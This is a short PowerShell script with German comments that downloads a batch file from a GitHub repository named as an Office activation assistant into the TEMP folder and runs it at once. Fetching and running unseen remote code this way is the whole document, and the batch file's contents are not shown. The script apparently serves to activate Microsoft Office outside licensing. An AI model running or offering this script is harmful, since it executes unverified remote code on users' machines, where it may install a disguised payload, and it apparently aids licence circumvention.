# TLS 1.2 erzwingen, damit der Download auch auf alten Systemen funktioniert
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Batch-Datei herunterladen
$batchContent = Invoke-RestMethod 'https://raw.githubusercontent.com/badgeart23/office-Aktivierungsassistent/main/office_Aktivierungshilfe.cmd'

# Temporäre Datei anlegen
$tempFile = "$env:TEMP\office_Aktivierungshilfe.cmd"

# Inhalt speichern
$batchContent | Out-File -FilePath $tempFile -Encoding ASCII

# Batch-Datei starten
Start-Process cmd.exe "/c $tempFile"
